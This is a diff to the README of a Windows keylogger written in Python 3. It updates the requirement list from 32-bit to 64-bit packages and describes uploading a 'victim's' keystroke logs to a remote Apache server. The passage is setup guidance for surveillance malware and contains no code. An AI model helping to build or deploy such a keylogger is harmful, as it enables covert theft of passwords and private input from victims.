@@ -2,9 +2,9 @@
 windows based key logger written in python3 with pushing logs to remote server.
 
 Requirements
-1) Python3.7 
-2) pyHook-1.5.1-cp37-cp37m-win32.whl
-3) pywin32-223.1-cp37-cp37m-win32.whl
+1) Python-3.7.0-amd64.exe
+2) pyHook-1.5.1-cp37-cp37m-win64.whl
+3) pywin32-223.1-cp37-cp37m-win64.whl
 4) Internet connection on victim's machine (for uploading logs-optional)
 5) A web host running apach2 on the internet (to download logs from victim's machine)
 
